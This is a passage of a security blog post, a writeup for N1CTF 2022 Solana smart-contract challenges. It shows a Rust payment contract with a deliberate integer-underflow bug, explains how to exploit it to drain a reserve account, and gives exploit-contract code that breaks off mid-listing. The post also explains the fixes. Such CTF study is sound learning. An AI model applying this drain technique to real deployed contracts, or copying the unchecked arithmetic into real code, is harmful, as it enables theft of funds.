@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>N1CTF 2022 Solana Challenges Writeups - Midas Blog</title><meta name="Description" content="Writeups for N1CTF 2022 Solana challenges"><meta property="og:title" content="N1CTF 2022 Solana Challenges Writeups" />
+<meta property="og:description" content="Writeups for N1CTF 2022 Solana challenges" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lkmidas.github.io/posts/20221128-n1ctf2022-writeups/" /><meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-28T08:43:57-06:00" />
+<meta property="article:modified_time" content="2022-11-28T08:43:57-06:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
+
+<meta name="twitter:title" content="N1CTF 2022 Solana Challenges Writeups"/>
+<meta name="twitter:description" content="Writeups for N1CTF 2022 Solana challenges"/>
+<meta name="application-name" content="Midas Blog">
+<meta name="apple-mobile-web-app-title" content="Midas Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20221128-n1ctf2022-writeups/" /><link rel="prev" href="https://lkmidas.github.io/posts/20220704-ggctf2022-writeups/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "N1CTF 2022 Solana Challenges Writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/lkmidas.github.io\/posts\/20221128-n1ctf2022-writeups\/"
+        },"genre": "posts","wordcount":  2116 ,
+        "url": "https:\/\/lkmidas.github.io\/posts\/20221128-n1ctf2022-writeups\/","datePublished": "2022-11-28T08:43:57-06:00","dateModified": "2022-11-28T08:43:57-06:00","publisher": {
+            "@type": "Organization",
+            "name": "Midas"},"author": {
+                "@type": "Person",
+                "name": "Midas"
+            },"description": "Writeups for N1CTF 2022 Solana challenges"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">N1CTF 2022 Solana Challenges Writeups</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw"></i>writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-11-28">2022-11-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2116 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#about-solana">About Solana</a></li>
+    <li><a href="#n1ctf-2022---utility-payment-service">N1CTF 2022 - Utility Payment Service</a>
+      <ul>
+        <li><a href="#given-files">Given files</a></li>
+        <li><a href="#the-target-contract-functionalities">The target contract functionalities</a></li>
+        <li><a href="#the-vulnerability">The vulnerability</a></li>
+        <li><a href="#the-server-program">The server program</a></li>
+        <li><a href="#the-exploit-contract">The exploit contract</a></li>
+      </ul>
+    </li>
+    <li><a href="#n1ctf-2022---simple-staking">N1CTF 2022 - Simple Staking</a>
+      <ul>
+        <li><a href="#given-files-1">Given files</a></li>
+        <li><a href="#the-target-contract-functionalities-1">The target contract functionalities</a></li>
+        <li><a href="#the-server-program-1">The server program</a></li>
+        <li><a href="#the-vulnerability-1">The vulnerability</a></li>
+        <li><a href="#the-exploit-contract-1">The exploit contract</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the section that you are interested in.</em></div>
+        </div>
+    </div>
+<h2 id="preface">Preface</h2>
+<p>It&rsquo;s been a pretty long time since I last wrote a blog post and my blog is collecting dust. Therefore, I decided to start writing about some basic stuffs that I learnt about pwning Solana Smart Contract, something that I am currently interested in and have been learning it for the past several weeks. Again, like my previous series about the Linux kernel, I will use CTF challenges as targets for my study. This post will be about 2 Solana challenges in N1CTF 2022, which is the most recent CTF that I have played.</p>
+<h2 id="about-solana">About Solana</h2>
+<p>I won&rsquo;t go into details about Solana or blockchain related stuffs in this post because first of all, I myself am not fully understand everything about them still, and I don&rsquo;t want to spread misinformation; and secondly, it would be quite redundant since there exists many resources about Solana on the Internet already. Some of those resources:</p>
+<ul>
+<li>Solana documentation: <a href="https://docs.solana.com/developers" target="_blank" rel="noopener noreffer">https://docs.solana.com/developers</a></li>
+<li>Solana Cookbook: <a href="https://solanacookbook.com/" target="_blank" rel="noopener noreffer">https://solanacookbook.com/</a></li>
+<li>Anchor documentation: <a href="https://www.anchor-lang.com/" target="_blank" rel="noopener noreffer">https://www.anchor-lang.com/</a></li>
+<li>The Anchor Book: <a href="https://book.anchor-lang.com/" target="_blank" rel="noopener noreffer">https://book.anchor-lang.com/</a></li>
+<li><code>@pencilflip</code>&rsquo;s tweet about common Anchor-based contracts vulnerabilities: <a href="https://twitter.com/pencilflip/status/1483880018858201090" target="_blank" rel="noopener noreffer">https://twitter.com/pencilflip/status/1483880018858201090</a></li>
+</ul>
+<h2 id="n1ctf-2022---utility-payment-service">N1CTF 2022 - Utility Payment Service</h2>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li><strong>Given file:</strong> <a href="/posts/20221128-n1ctf2022-writeups/Utility_Payment_Service.tar.gz" rel="">Utility_Payment_Service.tar.gz</a>.</li>
+<li><strong>Language:</strong> vanilla Rust program</li>
+<li><strong>Bug type:</strong> Integer underflow</li>
+</ul>
+</div>
+        </div>
+    </div>
+<h3 id="given-files">Given files</h3>
+<p>There are a handful of files that are given with the challenge, so I will briefly walkthrough all of them in this section. First of all, we have 3 directories: <code>program</code>, <code>server</code>, and <code>solve</code>.</p>
+<ul>
+<li>The <code>program</code> directory is a Rust project containing the source code of the target contract itself. It consists of some usual <code>cargo</code> stuffs and the <code>src</code> directory, containing the Rust source files <code>entrypoints.rs</code>, <code>lib.rs</code>, and <code>processor.rs</code> (more on them later).</li>
+<li>The <code>server</code> directory is also a Rust project implementing a program that will handle our connection to the challenge&rsquo;s server. It is written using <a href="https://github.com/otter-sec/solana-poc-framework" target="_blank" rel="noopener noreffer">Ottersec&rsquo;s Solana PoC framework</a>, and is used to initialize the Solana environment everytime we connect to the server.</li>
+<li>The <code>solve</code> directory is yet again another Rust project. Our job is to modify the <code>src/processor.rs</code> file here to implement our exploit contract, then run the <code>solve.py</code> script to run this contract against the server and hopefully retrieve the flag if our exploit works.</li>
+</ul>
+<h3 id="the-target-contract-functionalities">The target contract functionalities</h3>
+<p>Let&rsquo;s take a deeper look at the functionalities of our target contract. As the name suggests, it&rsquo;s a payment service that is implemented with two PDAs: a <code>reserve</code> account to store all the actual funds, and an <code>escrow</code> account for each user to manage their balance on the contract:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="cp">#[repr(C)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[derive(BorshSerialize, BorshDeserialize)]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Escrow</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">user</span>: <span class="nc">Pubkey</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">amount</span>: <span class="kt">u16</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="n">bump</span>: <span class="kt">u8</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>There are 4 instructions that can be used to interact with this contract. Firstly, the user can invoke the <code>Init</code> instruction to create their own <code>escrow</code> account, the amount of funds stored in this account is initialized to 0, as to be expected:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">invoke_signed</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&amp;</span><span class="n">system_instruction</span>::<span class="n">create_account</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">expected_escrow</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="mi">1</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ESCROW_ACCOUNT_SIZE</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">program</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&amp;</span><span class="p">[</span><span class="n">user</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w"> </span><span class="n">escrow_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w"> </span><span class="n">sys_prog</span><span class="p">.</span><span class="n">clone</span><span class="p">()],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="p">[</span><span class="s">&#34;ESCROW&#34;</span><span class="p">.</span><span class="n">as_bytes</span><span class="p">(),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(),</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="n">escrow_bump</span><span class="p">]]],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">escrow_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Escrow</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user</span>: <span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">amount</span>: <span class="mi">0</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bump</span>: <span class="nc">escrow_bump</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span></code></pre></div><p>Next, users can deposit and withdraw their lamports to the contract by using the <code>Deposit</code> and <code>Withdraw</code> instructions. When the <code>Deposit</code> instruction is invoked, there are some checks that are made before the transactions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="fm">assert!</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">is_signer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="p">(</span><span class="n">expected_reserve</span><span class="p">,</span><span class="w"> </span><span class="n">_reserve_bump</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_reserve</span><span class="p">(</span><span class="o">*</span><span class="n">program</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">assert_eq!</span><span class="p">(</span><span class="n">expected_reserve</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">reserve</span><span class="p">.</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="p">(</span><span class="n">expected_escrow</span><span class="p">,</span><span class="w"> </span><span class="n">_escrow_bump</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_escrow</span><span class="p">(</span><span class="o">*</span><span class="n">program</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="fm">assert_eq!</span><span class="p">(</span><span class="n">expected_escrow</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">escrow_account</span><span class="p">.</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>These checks ensure that the user who invoked the instruction is the signer of the transaction, the <code>reserve</code> account is the correct PDA which belongs to the contract, and the <code>escrow</code> account is the correct PDA which belongs to the user. After that, the desired amount of lamport will be transferred to the <code>reserve</code> account, and the <code>amount</code> field of the <code>escrow</code> account will also be increased accordingly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">system_instruction</span>::<span class="n">transfer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">reserve</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">deposit_amount</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">reserve</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sys_prog</span><span class="p">.</span><span class="n">clone</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">escrow_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">Escrow</span>::<span class="n">deserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="o">&amp;</span><span class="p">(</span><span class="o">*</span><span class="n">escrow_account</span><span class="p">.</span><span class="n">data</span><span class="p">).</span><span class="n">borrow_mut</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">escrow_data</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">deposit_amount</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>The <code>Withdraw</code> instruction is pretty much the same, after some checks, all the lamports in <code>escrow_data.amount</code> will be transferred from the <code>reserve</code> account to the <code>user</code>, and <code>escrow</code> account&rsquo;s <code>amount</code> will be set to 0.</p>
+<p>The final instruction of this contract is the most unique and interesting one, as it allows a user to use their funds directly from the <code>escrow</code> account to make &ldquo;utility payment&rdquo;. When the <code>Pay</code> instruction is invoked, there are some usual checks like the ones above, following by the payment logic:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">base_fee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">15_</span><span class="k">u16</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="n">escrow_data</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">amount</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">base_fee</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">escrow_data</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">base_fee</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">assert!</span><span class="p">(</span><span class="n">escrow_data</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">amount</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">escrow_data</span><span class="p">.</span><span class="n">amount</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">amount</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">msg</span><span class="o">!</span><span class="p">(</span><span class="s">&#34;ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>And this is exactly where the vulnerability lies.</p>
+<h3 id="the-vulnerability">The vulnerability</h3>
+<p>As we can see in the code snippet above, the user can only make a payment if they have deposited 10 lamports or more. After that, the desired amount of lamport will be used to make a payment, but the minimum amount that will be used is <code>base_fee</code>, which equals to 15.</p>
+<p>So what if the user invokes this instruction with an amount that is above 10 but below 15? In this case, both <code>escrow_data.amount &gt;= 10</code> and <code>amount &lt; base_fee</code> checks will pass, and then <code>escrow_data.amount -= base_fee</code> will be executed. Therefore, if they have only deposited an amount that is less than 15, their <code>escrow_data.amount</code> will be less than 15, and this will be an <strong>integer underflow</strong> because <code>escrow_data.amount</code> is an unsigned type <code>u16</code>.</p>
+<p>A common misconception for Rust developers is that Rust is a safe language and will always check for arithmetic overflows/underflows by itself. This is <strong>NOT TRUE</strong>, by default, Rust will check for these things <strong>ONLY IN DEBUG BUILD</strong>, and not release build. Rust will silently ignores arithmetic overflows/underflows in its default release build, the same way C does. As far as I know, there are 2 ways to tell Rust to check for those in the release build:</p>
+<ul>
+<li>By using <code>.checked_</code> functions, for example, a safe arithmetic in this case will be <code>escrow_data.amount.checked_sub(base_fee)</code>.</li>
+<li>By setting the <code>overflow-checks</code> option to <code>true</code> in <code>Cargo.toml</code>, as explained in the Rust documentation <a href="https://doc.rust-lang.org/cargo/reference/profiles.html#overflow-checks" target="_blank" rel="noopener noreffer">here</a>. In this challenge, this option is not enabled in <code>program/Cargo.toml</code>.</li>
+</ul>
+<h3 id="the-server-program">The server program</h3>
+<p>Let&rsquo;s take a quick look at what are initialized on the server before crafting our exploit, implemented in <code>server/src/main.rs</code>. It&rsquo;s actually pretty simple, this is what it does step by step:</p>
+<ol>
+<li>Make a <code>user</code> account</li>
+<li>Make a <code>reserve</code> PDA for the target contract</li>
+<li>Give <code>user</code> 50 lamports</li>
+<li>Give <code>reserve</code> 1_000_000 lamports</li>
+<li>Run our exploit contract</li>
+<li>Check if <code>user</code>&rsquo;s balance is more than 60_000 or not, if so then print the flag.</li>
+</ol>
+<p>So our goal is clearly to turn our 50 lamports to an amount greater than 60_000 with our exploit contract.</p>
+<h3 id="the-exploit-contract">The exploit contract</h3>
+<p>As explained in the vulnerability section above, our plan is to invoke the <code>Pay</code> instruction with an amount greater than 10 and less than 15, while our <code>escrow_data.amount</code> is also greater than 10 and less than 15. The steps to do that are:</p>
+<ol>
+<li>Invoke <code>Init</code> to initialize our <code>escrow</code> account</li>
+<li>Invoke <code>Deposit</code> with an amount greater than 10 and less than 15.</li>
+<li>Invoke <code>Pay</code> with the same amount as above, to underflow the unsigned <code>escrow_data.amount</code> to a very large value.</li>
+<li>Invoke <code>Withdraw</code> to withdraw the entire balance that we just gained.</li>
+</ol>
+<p>Conveniently, <code>solve/src/processor.rs</code> already implemented the first invocation for us:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">Instruction</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">program_id</span>: <span class="o">*</span><span class="n">utility_program</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">accounts</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">reserve</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">escrow_account</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span>::<span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">data</span>: <span class="nc">ServiceInstruction</span>::<span class="n">Init</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">try_to_vec</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">.</span><span class="n">unwrap</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">reserve</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">escrow_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">sys_prog_account</span><span class="p">.</span><span class="n">clone</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">],</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>Therefore, what I did was to copy this invocation 3 more times, and then just simply change the instruction names and arguments:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&amp;</span><span class="n">Instruction</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">program_id</span>: <span class="o">*</span><span class="n">utility_program</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">accounts</span>: <span class="nc">vec</span><span class="o">!</span><span class="p">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="p">.</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">
